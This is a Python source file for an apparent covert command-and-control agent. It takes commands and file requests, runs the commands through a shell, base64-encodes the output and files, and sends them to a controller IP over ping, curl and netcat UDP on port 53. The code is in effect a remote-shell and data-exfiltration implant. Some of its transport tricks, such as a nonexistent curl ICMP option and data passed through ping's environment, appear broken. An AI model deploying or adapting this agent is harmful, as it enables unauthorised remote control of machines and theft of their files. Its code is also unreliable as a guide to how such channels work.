#!/usr/bin/env python3
"""
Low-Privilege ICMP Agent
Uses standard system tools instead of raw sockets
No root privileges required, but with limited functionality
"""

import os
import sys
import time
import subprocess
import base64
import json
import threading
from typing import Optional

# Import utility functions
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.utils import (
    validate_ip, safe_path, validate_command, create_directories, 
    safe_file_write, create_low_privilege_mode, send_icmp_low_privilege
)

# Configuration
OUTPUT_DIR = "../data/outputs"
create_directories(OUTPUT_DIR)

# Low privilege mode configuration
LOW_PRIV_CONFIG = create_low_privilege_mode()

class LowPrivilegeAgent:
    """
    ICMP Agent that works without root privileges
    Uses standard ping and system tools
    """
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.running = False
        self.session_id = f"sess_{int(time.time())}"
        
    def send_response(self, response: str) -> bool:
        """
        Send response using low-privilege methods
        """
        try:
            # Encode response
            encoded_response = base64.b64encode(response.encode()).decode()
            
            # Split into chunks if too large
            max_size = LOW_PRIV_CONFIG['max_payload_size']
            chunks = [encoded_response[i:i+max_size] for i in range(0, len(encoded_response), max_size)]
            
            for i, chunk in enumerate(chunks):
                payload = f"RESP:{self.session_id}:{i+1}/{len(chunks)}:{chunk}"
                
                # Try different methods to send
                success = False
                
                # Method 1: Environment variable with ping
                env = os.environ.copy()
                env['ICMP_DATA'] = payload
                try:
                    result = subprocess.run([
                        'ping', '-c', '1', self.target_ip
                    ], capture_output=True, text=True, timeout=10, env=env)
                    if result.returncode == 0:
                        success = True
                except Exception:
                    pass
                
                # Method 2: Use curl with ICMP (if available)
                if not success:
                    try:
                        result = subprocess.run([
                            'curl', '--icmp', '-d', payload, f'icmp://{self.target_ip}'
                        ], capture_output=True, text=True, timeout=10)
                        if result.returncode == 0:
                            success = True
                    except Exception:
                        pass
                
                # Method 3: Use netcat with UDP (fallback)
                if not success:
                    try:
                        result = subprocess.run([
                            'nc', '-u', self.target_ip, '53'
                        ], input=payload, capture_output=True, text=True, timeout=10)
                        if result.returncode == 0:
                            success = True
                    except Exception:
                        pass
                
                if success:
                    print(f"Sent chunk {i+1}/{len(chunks)}")
                    time.sleep(1)  # Rate limiting
                else:
                    print(f"Failed to send chunk {i+1}")
                    
            return True
            
        except Exception as e:
            print(f"Error sending response: {e}")
            return False
    
    def execute_command(self, command: str) -> str:
        """
        Execute command safely
        """
        try:
            if not validate_command(command):
                return "Error: Command contains potentially dangerous operations"
            
            # Use subprocess with timeout
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=30
            )
            
            if result.returncode == 0:
                return result.stdout
            else:
                return f"Error: {result.stderr}"
                
        except subprocess.TimeoutExpired:
            return "Error: Command timed out after 30 seconds"
        except Exception as e:
            return f"Execution failed: {e}"
    
    def get_file_content(self, filepath: str) -> str:
        """
        Get file content safely
        """
        try:
            safe_path_name = safe_path(filepath)
            
            if os.path.isfile(safe_path_name):
                with open(safe_path_name, 'rb') as f:
                    data = f.read()
                encoded = base64.b64encode(data).decode()
                return f"FILE:{safe_path_name}\n{encoded}"
            else:
                return f"Error: File {safe_path_name} not found"
                
        except Exception as e:
            return f"Error reading file: {e}"
    
    def listen_for_commands(self):
        """
        Listen for commands using low-privilege methods
        """
        print("Low-Privilege ICMP Agent Started")
        print("Listening for commands...")
        print("Note: Limited functionality without root privileges")
        
        while self.running:
            try:
                # Method 1: Check for environment variables set by controller
                icmp_data = os.environ.get('ICMP_COMMAND')
                if icmp_data:
                    self.process_command(icmp_data)
                    # Clear the environment variable
                    if 'ICMP_COMMAND' in os.environ:
                        del os.environ['ICMP_COMMAND']
                
                # Method 2: Check for command files
                command_file = f"/tmp/icmp_command_{self.session_id}"
                if os.path.exists(command_file):
                    try:
                        with open(command_file, 'r') as f:
                            command_data = f.read().strip()
                        self.process_command(command_data)
                        os.remove(command_file)
                    except Exception as e:
                        print(f"Error reading command file: {e}")
                
                # Method 3: Use netstat to monitor network activity
                # This is very limited but doesn't require privileges
                
                time.sleep(5)  # Check every 5 seconds
                
            except KeyboardInterrupt:
                print("Agent stopped by user")
                break
            except Exception as e:
                print(f"Error in command listener: {e}")
                time.sleep(10)
    
    def process_command(self, command_data: str):
        """
        Process received command
        """
        try:
            # Parse command data
            if command_data.startswith("CMD:TASK:"):
                command = command_data[9:].strip()
                print(f"Received command: {command}")
                
                result = self.execute_command(command)
                self.send_response(result)
                
            elif command_data.startswith("CMD:GET:"):
                filepath = command_data[8:].strip()
                print(f"Received file request: {filepath}")
                
                result = self.get_file_content(filepath)
                self.send_response(result)
                
            else:
                print(f"Unknown command format: {command_data}")
                
        except Exception as e:
            print(f"Error processing command: {e}")
    
    def start(self):
        """
        Start the low-privilege agent
        """
        self.running = True
        self.listen_for_commands()
    
    def stop(self):
        """
        Stop the agent
        """
        self.running = False

def main():
    """
    Main function for low-privilege agent
    """
    if len(sys.argv) < 2:
        print("Usage: python3 low_privilege_agent.py <CONTROLLER_IP>")
        print("Example: python3 low_privilege_agent.py 192.168.1.100")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    if not validate_ip(target_ip):
        print(f"Error: Invalid IP address: {target_ip}")
        sys.exit(1)
    
    agent = LowPrivilegeAgent(target_ip)
    
    try:
        agent.start()
    except KeyboardInterrupt:
        print("Agent stopped by user")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 